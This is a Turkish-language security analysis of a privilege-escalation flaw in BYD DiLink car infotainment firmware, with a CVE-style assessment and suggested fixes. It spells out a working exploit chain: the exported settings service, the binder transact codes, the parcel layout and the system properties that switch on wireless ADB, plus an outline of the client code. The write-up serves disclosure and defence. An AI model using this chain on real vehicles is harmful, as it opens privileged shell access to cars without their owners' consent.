# BYD DiLink TS Settings Servisi — Detaylı Arka Kapı Analizi

Firmware: 51.1.4.2605140.1 (rb-byd-idc_hqx121c1-pcs04_SOP-UKE_release_2026.20.4, Android 11 / SDK 30)

---

## 1. Özet

`com.ts.appservice.settings` paketindeki **SettingsService** isimli servis,
manifest'te **exported=true ve hiçbir izin koruması olmadan** duruyor. Servis,
içinde **`setSystemPersist(key, value)`** diye bir binder metodu barındırıyor;
bu metot gelen anahtar/değeri **hiçbir filtreleme yapmadan**
`SystemProperties.set(key, value)`'ye iletiyor. Servis `android.uid.system`
ile çalıştığı için (system_app SELinux domain'i), normal bir uygulamanın asla
yazamayacağı ayrıcalıklı property'leri **herhangi bir aplikasyon adına**
yazdırılabiliyor. Hedef property olarak `sys.connect.adb.wiress=1` seçildiğinde,
init tarafındaki resmi tetikleyici adbd'yi TCP 5555 portunda yeniden
başlatıyor → kablosuz ADB.

---

## 2. Yol haritası (zincir)

```
[DiLink-Inspector (untrusted_app)]
   │ bindService (explicit intent, izinsiz)
   ▼
com.ts.appservice.settings/.SettingsService          ← EXPORTED, perm=YOK
   │ onBind() → koşulsuz SettingsAdapterServiceImpl döndürür
   ▼
ISettingsAdapterService.Stub  (boot classpath: ts-framework.jar)
   │ transact(2) + "property"   ← case 1 = isServiceBound, case 2 = bu!
   ▼
SettingsAdapterServiceImpl.getSettingsAdapterService("property")
   │ hash-switch case 1 → mIPropertyServiceBinder
   ▼
IPropertyServiceBinder  (IPropertySettingsService.Stub)
   │ transact(10) + key + value
   ▼
IPropertyServiceBinder.setSystemPersist(key, value)      ← FİLTRE YOK
   │ SystemProperties.set(key, value)   [system_app yetkisiyle]
   ▼
sys.connect.adb.wiress = 1   (SELinux: system_prop — system_app yazabilir ✓)
   ▼
init.bydidc.rc (vendor) — resmi tetikleyici:
   on property:sys.connect.adb.wiress=1
       setprop service.adb.tcp.port 5555   ← init (vendor_init) yazabilir ✓
       stop adbd
       start adbd                          ← adbd TCP 5555 dinleyerek kalkar
   ▼
127.0.0.1:5555 → RSA onayı → ADB shell
```

---

## 3. Dosya dosya, satır satır

### 3.1 SettingsService.apk → AndroidManifest.xml
- `package="com.ts.appservice.settings"`, `sharedUserId="android.uid.system"`
- `<service android:name="com.ts.appservice.settings.SettingsService" android:exported="true">` → **izin tanımı yok** (permission attribute yok).

### 3.2 SettingsService.java — `com.ts.appservice.settings`
```java
public IBinder onBind(Intent intent) {
    return this.mSettingsAdapterServiceImpl;   // koşulsuz; intent'e bakılmıyor
}
```
- Servis ayrıca VR adaptörü gibi işler yapıyor; onBind hepsinden bağımsız
  tek satır. Action/extras kontrolü, çağıran kimlik denetimi YOK.

### 3.3 SettingsAdapterServiceImpl.java — `com.ts.appservice.settings`
```java
public class SettingsAdapterServiceImpl extends ISettingsAdapterService.Stub {
    private IPropertyServiceBinder mIPropertyServiceBinder;          // satır 41
    // kurucuda: satır 56
    this.mIPropertyServiceBinder = new IPropertyServiceBinder(this.mContext);

    public IBinder getSettingsAdapterService(String serviceName) {   // satır 111
        switch (serviceName.hashCode()) {
            case -993141291: if (serviceName.equals("property")) { c = 1; break; }
            // language→0, theme→2, appBoot→3, mic→4, key→5, cluster→6,
            // version→7, panorama→8, container→9, location→10, cartips→11,
            // dms→12, appconfig→13
        }
        switch (c) {
            case 1: return this.mIPropertyServiceBinder;             // satır 220
            ...
        }
    }
}
```
- **Çağıranın kimliği hiç sorgulanmıyor** (getCallingUid/signature kontrolü yok).
- Aynı kapı 13 alt-servis daha dağıtıyor (theme, key, cluster...) — yüzey
  property'den büyük.

### 3.4 IPropertyServiceBinder.java — `...impl.property`
```java
public class IPropertyServiceBinder extends IPropertySettingsService.Stub {
    public void setSystemPersist(String key, String value) {         // satır 81
        SystemProperties.set(key, value);                            // satır 83  ← KAPININ KENDİSİ
    }
    public int setSettingsInt(String key, int value) {               // satır 72
        Settings.System.putInt(this.mContext.getContentResolver(), key, value);
    }
    public String getSystemPersist(String key)  { ... SystemProperties.get(key) ... }
    // + getSystemPersistInt/Boolean, getSettingsInt/Boolean/String, getBtContact
}
```
- `setSystemPersist`: **anahtar beyaz listesi yok, değer doğrulaması yok.**
- `setSettingsInt`: Settings.System'e system uid adına yazım (WRITE_SETTINGS
  denetimi yazan tarafın uid'ine bakar → sistem geçer). (Bonus yüzey; biz
  kullanmadık.)

### 3.5 AIDL arayüzleri — ts-framework.jar (BOOT CLASSPATH!)
Stub sınıfları APK'da değil; `com.ts.lib.settings.*` framework jar'ında
(`/system/framework/ts-framework.jar`, boot-ts-framework.vdex ile önceden
derlenmiş). Yani her TS aplikasyonu bu arayüzleri classtan görür.

**ISettingsAdapterService** — descriptor: `com.ts.lib.settings.ISettingsAdapterService`

| transact kodu | metot | imza |
|---|---|---|
| 1 | isServiceBound | `()Z` |
| **2** | **getSettingsAdapterService** | `(String) IBinder` |

**IPropertySettingsService** — descriptor: `com.ts.lib.settings.property.IPropertySettingsService`

| transact kodu | metot |
|---|---|
| 1 | getBtContact(String) String |
| 2 | getSettingsBoolean(String) Z |
| 3 | getSettingsInt(String) I |
| 4 | getSettingsString(String) String |
| 5 | getSystemPersist(String) String |
| 6 | getSystemPersistBoolean(String) Z |
| 7 | getSystemPersistInt(String) I |
| 8 | setSettingsInt(String,int) |
| 9 | setSettingsBoolean(String,int) |
| **10** | **setSystemPersist(String,String)** |

Kodlar dexdump `-d` çıktısından, `packed-switch-data` payload'ının
(`first_key=1, size=10`) hedef adresleri çözülerek **bytecode düzeyinde**
doğrulandı: case 10 → 0x0010 handler'ı → `readString; readString; invoke
setSystemPersist; writeNoException`.

### 3.6 Parcel protokolü (istemci tarafında ne yazılıyor)
```
# Adapter çağrısı (transact 2):
data.writeInterfaceToken("com.ts.lib.settings.ISettingsAdapterService");
data.writeString("property");
reply.readException(); IBinder inner = reply.readStrongBinder();

# Property çağrısı (transact 10):
data.writeInterfaceToken("com.ts.lib.settings.property.IPropertySettingsService");
data.writeString(key);      // "sys.connect.adb.wiress"
data.writeString(value);    // "1"
reply.readException();
```

---

## 4. Neden yetki geçiyor — SELinux kanıtı

| Property | context (property_contexts) | kim yazabilir (sepolicy CIL) |
|---|---|---|
| `sys.connect.adb.wiress` | `sys.` → `system_prop` | `system_app` ✓ (plat) |
| `persist.adb.tcp.port` | `vendor_adb_tcp_port_prop` | `system_app_30_0` ✓ (vendor cil) |
| `service.adb.tcp.port` | `adbd_config_prop` | **yalnız** `adbd` + `vendor_init` |
| — | — | `untrusted_app`: **sıfır** property set izni |

- Servisin domain'i: `vendor_seapp_contexts`'te özel satırı yok →
  `user=system seinfo=platform` kuralı → **system_app**.
- Bizim app'in yazamadığını bu yüzden sistem uygulamasına **proxy** olarak
  yazdırıyoruz; kapı kodda izin denetimi olmadığı için bu mümkün.
- `service.adb.tcp.port`'u kimse yazamaz ama gerek de yok: init tetiği onu
  kendisi yazar (aşağıda).

---

## 5. init tarafı — resmi tetikleyici (vendor /etc/init/init.bydidc.rc, satır 73-82)
```
on property:sys.connect.adb.wiress=1
    setprop service.adb.tcp.port 5555
    stop adbd
    start adbd

on property:sys.connect.adb.wiress=0
    setprop service.adb.tcp.port -1
    stop adbd
    start adbd
```
- Bu, BYD'nin AdbActivity'deki (layout'tan GONE yapılmış) "Kablosuz ADB"
  anahtarının kullandığı **resmi mekanizmanın aynısı** — biz aynı property'yi
  UI olmadan, ayrıcalıklı servis üzerinden yazıyoruz.
- adbd açılışta `service.adb.tcp.port` → boşsa `persist.adb.tcp.port` okur;
  5555 ise TCP dinler. Bu yüzden sihirbaz ikisini de yazıyor:
  - `sys.connect.adb.wiress=1` → **anında** (adbd restart)
  - `persist.adb.tcp.port=5555` → **kalıcı** (her reboot'da)
  - `persist.sys.adb.wiress.enable=true` → BYD arayüzlerinin durum bayrağı
  - `service.adb.tcp.port=5555` → (servis yazabilirse; system_app'in bu propa
    izni yok, reddedilir — zararsız, init zaten yazıyor)

---

## 6. App tarafındaki istemci — TsPropBridge.java (DiLink-Inspector)
```java
public final class TsPropBridge {
    public static final String PKG = "com.ts.appservice.settings";
    public static final String SERVICE = "com.ts.appservice.settings.SettingsService";
    public static final String ADAPTER_DESC = "com.ts.lib.settings.ISettingsAdapterService";
    public static final String PROPERTY_DESC = "com.ts.lib.settings.property.IPropertySettingsService";

    static String withService(Context ctx, Job job, long timeoutMs)
        // bindService + CountDownLatch + 10 sn zaman aşımı + unbind

    static IBinder getPropertyBinder(IBinder adapter)
        // transact(2): token(ADAPTER_DESC) + "property" → readStrongBinder
        // NOT: ilk sürümde transact(1) idi → isServiceBound() çağrılıyordu →
        // cevapta int vardı → readStrongBinder null → "Property binder null döndü".
        // Bytecode çözümlemesiyle 1↔2 düzeltildi (v2.8.2).

    static String setProp(IBinder prop, String key, String value)
        // transact(10): token(PROPERTY_DESC) + key + value → readException

    public static String enableWirelessAdb(Context ctx)
        // 4 property'yi sırayla yazar, sonuçları döndürür
}
```
Sihirbaz (`runWirelessWizard`) akışı: arka kapı yazımları → OTA y(31,77)
(adb_enabled=1) → 3 sn bekle → getprop doğrulama (init.svc.adbd / portlar) →
127.0.0.1:5555 bağlanma denemesi → `id` kanıtı → rapor.

---

## 7. Güvenlik açığı olarak değerlendirme (CVE tarzı)
- **Sınıf:** Ayrıcalıklı servis aracılığıyla kısıtsız sistem durumu değişikliği
  (CWE-269 / iletişim kanalında yetki denetimi eksikliği).
- **Koşul:** Sadece `bindService` — uygulamanın hiçbir izin istemesi gerekmez.
- **Etki:** system_app'in yazabildiığı HER property (system_prop,
  exported_system_radio_prop, vendor izinlileri…) + Settings.System yazımı.
  Somut sonuç: kablosuz ADB'nin uzaktan açılması (kanıtlandı), ayrıca
  dms/theme/key/cluster alt-servisleri ek yüzeyler.
- **Düzeltme önerisi (BYD tarafına):** SettingsService'e imza izni
  (`android:permission` signature) eklemek; `setSystemPersist`'a anahtar
  beyaz listesi; `getSettingsAdapterService`'te `Binder.getCallingUid`
  doğrulaması.

## 8. Nasıl bulundu (metodoloji özeti)
1. 90 APK'nın exported bileşen envanteri (izin × imza × ayrıcalık imzaları)
2. İlk geçişte "ilgisiz" görünen TS appservice servislerine ikinci geçiş
3. Decompile kaynaklarda `SystemProperties.set` taraması →
   `IPropertyServiceBinder.java:83`
4. Stub'ların boot classpath'te (ts-framework.jar) bulunup çıkarılması
5. dexdump `-d` + packed-switch payload çözümlemesi → kesin transact kodları
6. plat/vendor sepolicy CIL ayrıştırması → izin matrisi kanıtı
7. vendor init rc tetikleyici analizi → sömürü hedefinin seçimi
